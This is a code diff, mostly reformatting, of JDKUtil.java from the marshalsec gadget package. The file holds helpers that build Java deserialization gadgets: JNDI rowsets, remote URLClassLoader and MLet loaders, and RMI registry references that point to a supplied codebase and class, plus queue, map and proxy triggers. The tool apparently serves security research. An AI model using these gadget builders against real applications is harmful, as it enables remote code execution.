@@ -23,31 +23,14 @@ SOFTWARE.
 package marshalsec.gadgets;
 
 
-import java.io.InputStream;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
-import java.math.BigInteger;
-import java.net.MalformedURLException;
-import java.net.URL;
-import java.net.URLClassLoader;
-import java.rmi.RemoteException;
-import java.rmi.server.ObjID;
-import java.util.Comparator;
-import java.util.Enumeration;
-import java.util.HashMap;
-import java.util.HashSet;
-import java.util.Hashtable;
-import java.util.Iterator;
-import java.util.LinkedHashMap;
-import java.util.Map;
-import java.util.PriorityQueue;
-import java.util.Queue;
-import java.util.ServiceLoader;
-import java.util.TreeMap;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl;
+import com.sun.rowset.JdbcRowSetImpl;
+import marshalsec.UtilFactory;
+import marshalsec.util.Reflections;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
 
 import javax.activation.DataHandler;
 import javax.activation.DataSource;
@@ -55,38 +38,34 @@ import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
 import javax.crypto.NullCipher;
 import javax.management.loading.MLet;
-import javax.naming.Binding;
-import javax.naming.CannotProceedException;
-import javax.naming.NamingEnumeration;
-import javax.naming.NamingException;
-import javax.naming.Reference;
+import javax.naming.*;
 import javax.naming.directory.DirContext;
 import javax.naming.directory.SearchResult;
-
-import com.sun.jndi.rmi.registry.ReferenceWrapper;
-import com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl;
-import com.sun.rowset.JdbcRowSetImpl;
-
-import marshalsec.UtilFactory;
-import marshalsec.util.Reflections;
-import sun.rmi.server.UnicastRef;
-import sun.rmi.transport.LiveRef;
-import sun.rmi.transport.tcp.TCPEndpoint;
+import java.io.InputStream;
+import java.lang.reflect.*;
+import java.math.BigInteger;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.rmi.RemoteException;
+import java.rmi.server.ObjID;
+import java.util.*;
+import java.util.ServiceLoader;
 
 
 /**
  * @author mbechler
- *
  */
 public final class JDKUtil {
 
     /**
-     * 
+     *
      */
-    private JDKUtil () {}
+    private JDKUtil() {
+    }
 
 
-    public static JdbcRowSetImpl makeJNDIRowSet ( String jndiUrl ) throws Exception {
+    public static JdbcRowSetImpl makeJNDIRowSet(String jndiUrl) throws Exception {
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(jndiUrl);
         rs.setMatchColumn("foo");
@@ -95,7 +74,7 @@ public final class JDKUtil {
     }
 
 
-    public static DirContext makeContinuationContext ( String codebase, String clazz ) throws Exception {
+    public static DirContext makeContinuationContext(String codebase, String clazz) throws Exception {
         Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
         Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
         ccCons.setAccessible(true);
@@ -106,8 +85,8 @@ public final class JDKUtil {
     }
 
 
-    @SuppressWarnings ( "resource" )
-    public static Object makeIteratorTriggerNative ( UtilFactory uf, Object it ) throws Exception, ClassNotFoundException, NoSuchMethodException,
+    @SuppressWarnings("resource")
+    public static Object makeIteratorTriggerNative(UtilFactory uf, Object it) throws Exception, ClassNotFoundException, NoSuchMethodException,
             InstantiationException, IllegalAccessException, InvocationTargetException {
         Cipher m = Reflections.createWithoutConstructor(NullCipher.class);
         Reflections.setFieldValue(m, "serviceIterator", it);
@@ -135,7 +114,7 @@ public final class JDKUtil {
     }
 
 
-    public static Object adaptEnumerationToIterator ( Enumeration<?> enu ) throws ClassNotFoundException, NoSuchMethodException,
+    public static Object adaptEnumerationToIterator(Enumeration<?> enu) throws ClassNotFoundException, NoSuchMethodException,
             InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
         Class<?> clIt = Class.forName("sun.misc.Service$LazyIterator");
         Constructor<?> licons = clIt.getDeclaredConstructor(Class.class, ClassLoader.class);
@@ -148,7 +127,7 @@ public final class JDKUtil {
     }
 
 
-    public static Iterator<?> makeServiceIterator ( ClassLoader cl, Class<?> service ) throws Exception {
+    public static Iterator<?> makeServiceIterator(ClassLoader cl, Class<?> service) throws Exception {
         Class<?> clIt = Class.forName("sun.misc.Service$LazyIterator");
         Constructor<?> lciCons = clIt.getDeclaredConstructor(Class.class, ClassLoader.class);
         lciCons.setAccessible(true);
@@ -156,14 +135,14 @@ public final class JDKUtil {
     }
 
 
-    public static Iterable<?> makeServiceLoader ( ClassLoader cl, Class<?> service ) throws Exception {
+    public static Iterable<?> makeServiceLoader(ClassLoader cl, Class<?> service) throws Exception {
         return ServiceLoader.load(service, cl);
     }
 
 
-    public static URLClassLoader makeURLClassLoader ( String url ) throws MalformedURLException, Exception {
-        URLClassLoader ucl = new URLClassLoader(new URL[] {
-            new URL(url)
+    public static URLClassLoader makeURLClassLoader(String url) throws MalformedURLException, Exception {
+        URLClassLoader ucl = new URLClassLoader(new URL[]{
+                new URL(url)
         });
         Reflections.setFieldValue(ucl, "parent", null);
         Reflections.setFieldValue(ucl, "domains", new HashSet<>());
@@ -175,9 +154,9 @@ public final class JDKUtil {
     }
 
 
-    public static URLClassLoader makeMLet ( String url ) throws MalformedURLException, Exception {
-        URLClassLoader ucl = new MLet(new URL[] {
-            new URL(url)
+    public static URLClassLoader makeMLet(String url) throws MalformedURLException, Exception {
+        URLClassLoader ucl = new MLet(new URL[]{
+                new URL(url)
         });
         Reflections.setFieldValue(ucl, "parent", null);
         Reflections.setFieldValue(ucl, "domains", new HashSet<>());
@@ -189,8 +168,8 @@ public final class JDKUtil {
     }
 
 
-    @SuppressWarnings ( "unchecked" )
-    public static Enumeration<?> makeLazySearchEnumeration ( String codebase, String clazz ) throws Exception {
+    @SuppressWarnings("unchecked")
+    public static Enumeration<?> makeLazySearchEnumeration(String codebase, String clazz) throws Exception {
         DirContext ctx = makeContinuationContext(codebase, clazz);
         NamingEnumeration<?> inner = Reflections.createWithoutConstructor(LazySearchEnumerationImpl.class);
         Reflections.setFieldValue(inner, "nextMatch", new SearchResult("foo", ctx, null));
@@ -198,20 +177,20 @@ public final class JDKUtil {
     }
 
 
-    public static Enumeration<?> makeBindingEnumeration ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
+    public static Enumeration<?> makeBindingEnumeration(String codebase, String clazz) throws ClassNotFoundException, NoSuchMethodException,
             InstantiationException, IllegalAccessException, InvocationTargetException, Exception, NamingException, RemoteException {
         Class<?> cl = Class.forName("com.sun.jndi.rmi.registry.BindingEnumeration");
         Object enu = Reflections.createWithoutConstructor(cl);
         Reflections.setFieldValue(enu, "ctx", makeRegistryContext(makeRegistryImpl(codebase, clazz)));
-        Reflections.setFieldValue(enu, "names", new String[] {
-            "exp"
+        Reflections.setFieldValue(enu, "names", new String[]{
+                "exp"
         });
         Reflections.setFieldValue(enu, "nextName", 0);
         return (Enumeration<?>) enu;
     }
 
 
-    private static Object makeRegistryImpl ( String codebase, String clazz ) throws IllegalArgumentException, Exception {
+    private static Object makeRegistryImpl(String codebase, String clazz) throws IllegalArgumentException, Exception {
         Class<?> regcl = Class.forName("sun.management.jmxremote.SingleEntryRegistry");
         Object reg = Reflections.createWithoutConstructor(regcl);
         Reflections.setFieldValue(reg, "name", "exp");
@@ -225,7 +204,7 @@ public final class JDKUtil {
     }
 
 
-    private static ReferenceWrapper makeReference ( String codebase, String clazz ) throws Exception {
+    private static ReferenceWrapper makeReference(String codebase, String clazz) throws Exception {
         Reference ref = new Reference("Foo", clazz, codebase);
         ReferenceWrapper wrapper = Reflections.createWithoutConstructor(ReferenceWrapper.class);
         Reflections.setFieldValue(wrapper, "wrappee", ref);
@@ -234,7 +213,7 @@ public final class JDKUtil {
     }
 
 
-    private static Object makeRegistryContext ( Object regi ) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
+    private static Object makeRegistryContext(Object regi) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
             IllegalAccessException, InvocationTargetException, Exception {
         Class<?> regctxcl = Class.forName("com.sun.jndi.rmi.registry.RegistryContext");
         Object regctx = Reflections.createWithoutConstructor(regctxcl);
@@ -243,14 +222,13 @@ public final class JDKUtil {
     }
 
 
-    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
+    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
         HashMap<Object, Object> s = new HashMap<>();
         Reflections.setFieldValue(s, "size", 2);
         Class<?> nodeC;
         try {
             nodeC = Class.forName("java.util.HashMap$Node");
-        }
-        catch ( ClassNotFoundException e ) {
+        } catch (ClassNotFoundException e) {
             nodeC = Class.forName("java.util.HashMap$Entry");
         }
         Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
@@ -264,10 +242,10 @@ public final class JDKUtil {
     }
 
 
-    @SuppressWarnings ( {
-        "rawtypes", "unchecked"
-    } )
-    public static Queue<Object> makePriorityQueue ( Object tgt, Comparator comparator ) throws Exception {
+    @SuppressWarnings({
+            "rawtypes", "unchecked"
+    })
+    public static Queue<Object> makePriorityQueue(Object tgt, Comparator comparator) throws Exception {
         // create queue with numbers and basic comparator
         final PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
         // stub data for replacement later
@@ -276,17 +254,17 @@ public final class JDKUtil {
 
         // switch contents of queue
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        queueArray[ 0 ] = tgt;
-        queueArray[ 1 ] = tgt;
+        queueArray[0] = tgt;
+        queueArray[1] = tgt;
 
         return queue;
     }
 
 
-    @SuppressWarnings ( {
-        "rawtypes", "unchecked"
-    } )
-    public static TreeMap<Object, Object> makeTreeMap ( Object tgt, Comparator comparator ) throws Exception {
+    @SuppressWarnings({
+            "rawtypes", "unchecked"
+    })
+    public static TreeMap<Object, Object> makeTreeMap(Object tgt, Comparator comparator) throws Exception {
         TreeMap<Object, Object> tm = new TreeMap<>(comparator);
 
         Class<?> entryCl = Class.forName("java.util.TreeMap$Entry");
@@ -303,29 +281,29 @@ public final class JDKUtil {
     }
 
 
-    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-        allIfaces[ 0 ] = iface;
-        if ( ifaces.length > 0 ) {
+        allIfaces[0] = iface;
+        if (ifaces.length > 0) {
             System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
         }
         return iface.cast(Proxy.newProxyInstance(TemplatesUtil.class.getClassLoader(), allIfaces, ih));
     }
 
 
-    public static Map<String, Object> createMap ( final String key, final Object val ) {
+    public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<>();
         map.put(key, val);
         return map;
     }
 
 
-    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
         return (InvocationHandler) Reflections.getFirstCtor(TemplatesUtil.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
 
 
-    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
